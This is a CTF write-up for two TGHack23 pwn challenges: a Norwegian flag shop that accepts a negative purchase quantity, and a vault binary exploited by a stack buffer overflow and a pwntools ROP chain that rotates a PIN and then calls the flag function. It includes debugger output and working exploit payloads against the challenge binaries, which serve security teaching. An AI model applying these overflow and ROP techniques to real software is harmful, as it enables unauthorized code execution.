---
title: TGHack23
date: 2023-04-15 22:00:00 +0100
categories: [CTF, "2023"]
tags: [ctf, tghack, "2023", pwn, retwin]
---
Challenges were solved post-ctf.

# Pwn - Flag butikken
We have gotten a binary which when run displays some sort of shop
```
$ ./butikk
Velkommen til flag butikken! Her kan du kjøpe litt forskjellige flag!
Vi har ikke så mange enda, men flere kommer så følg med!
Du har 5 penger

1. Kjøp flag
2. Avslutt
> 1
1. CTF Flag - Antall: 1 - Pris: 100000
2. Norsk Flag - Antall: 10 - Pris: 5000
3. Svensk Flag - Antall: 500 - Pris: 5
> 1
Hvor mange vil du ha?
> 1
Total pris: 100000
Beklager, ikke nok penger :(
Du har 5 penger
```
It seems that we can specify the amount of flags we want to buy. We could reverse the binary to look at what the binary does with our input, but these shop-challenges sometimes do not handle negative numbers very well. So what happens if we try to buy -1 amount of CTF-flags?

```
1. Kjøp flag
2. Avslutt
> 1
1. CTF Flag - Antall: 1 - Pris: 100000
2. Norsk Flag - Antall: 10 - Pris: 5000
3. Svensk Flag - Antall: 500 - Pris: 5
> 1
Hvor mange vil du ha?
> -1
Total pris: -100000
Du kjøpte -1 for -100000
TG23{Underflow, overflow, all the flows}Du har 100005 penger
```
We get the flag!
```
TG23{Underflow, overflow, all the flows}Du har 100005 penger
```


# Pwn - Hvelvet
We are given another binary, but this one does not seem to do much
```
$ ./vault
Foran deg er en stor hvelv-dør, midt på er hjulet som sitter fast, men den står på tallet 0.
Til høyre er et display med en touchpad som lyser opp
Please supply passphrase: aaaa
$
```
If we give it a longer input it segfaults
```
$ ./vault
Foran deg er en stor hvelv-dør, midt på er hjulet som sitter fast, men den står på tallet 0.
Til høyre er et display med en touchpad som lyser opp
Please supply passphrase: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
$
```
Running checksec confirms that this might be some ROP challenge
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x3ff000)
```
From Ghidra we find the main function
```c
void main(void)

{
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;

  initialize();
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  printf(&DAT_00402068,(ulong)(uint)(int)number);
  puts(&DAT_004020d0);
  printf("Please supply passphrase: ");
  fgets((char *)&local_28,0x140,stdin);
  return;
}
```
There is also a function which prints us the flag if a pin is set correctly, looking something like this
```c
pin[0] = pin[0] ^ 1;
pin[1] = pin[0] ^ 2;
pin[2] = pin[0] ^ 3;
pin[3] = pin[0] ^ 4;

if(!strncmp(pin, code, 4)){
    puts("Sorry incorrect PIN");
    exit(1);
}
FILE *fp = fopen("flag.txt", "r");
chr = fgetc(f);
while(chr != EOF){
  printf("%c", chr);
  chr = fgetc(f);
}
```

We also have the functions `rotate_left`, `rotate_right` and `rotate`, which from Ghidra it seems that `rotate_left` and `rotate_right` rotates a number between 0-9, and `rotate`, which is called form both functions, assigns the number to the `code` array.

Pseudocode
```c
void rotate(){
  number = number + direction;
  code[idx] = number;
}

void rotate_left(){
  direction = -1;
  idx = (idx + 1) % 4;
  rotate();
}

void rotate_right(){
  direction = 1;
  idx = (idx + 1) % 4;
  rotate();
}
```
By overflowing the buffer in main we could call the rotate-functions to rotate the *code* to match the pin, then we could call the function printing the flag.

Our plan would then be:
- Find offset to RIP
- Find the pin, and rotate to match it
- Call flag-printing function

## Finding the offset to RIP
We find the offset using pwndbg using a cyclic pattern
```
pwndbg> cyclic 50
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
pwndbg> r
Starting program: /home/andreas/Downloads/tg23hack/writeups/pwn/pwn_hvelvet/TGHACK/Challenge/src/vault
Foran deg er en stor hvelv-dør, midt på er hjulet som sitter fast, men den står på tallet 0.
Til høyre er et display med en touchpad som lyser opp
Please supply passphrase: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga

Program received signal SIGSEGV, Segmentation fault.
<snip>
 ► 0x4014f6 <main+142>    ret    <0x6161616161616166>
<snip>
pwndbg> cyclic -l 0x6161616161616166
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```
The offset is 40

## Finding and matching the PIN
We find the address of the flag-printing function, `open_door`, using ROPgadget and call *open_door* with ROP. Inside of *open_door* we can break in GDB to view the PIN at the *strncmp* call


Building and sending the payload
```python

io = start()
io.recvuntil(b"passphrase:")

payload = b'A' * offset
payload += pack(exe.sym.open_door)

io.sendline(payload)
```
Breaking at the *strncmp* call we see the variables used in the function call
```
s1: 0x404070 (pin) ◂— 0x3030300031333337 /* '7331' */
s2: 0x404075 (code) ◂— 0xff00000030303030 /* '0000' */
n: 0x4
```

By playing with the rotations to get them correct and using the same method of breaking at *strncmp*, we end up with the payload
```python
payload = b'A' * offset
payload += pack(rot_right) * 3
payload += pack(rot_left) * 10
payload += pack(rot_right) * 8
payload += pack(rot_left) * 4
payload += pack(exe.sym.open_door)
io.sendline(payload)
```
Which gives ut the flag
```
$ python3 exploit.py
<snip>
[*] Switching to interactive mode
TG23{R0Ping around the v4ult}
[*] Got EOF while reading in interactive
$
```
```
TG23{R0Ping around the v4ult}
```
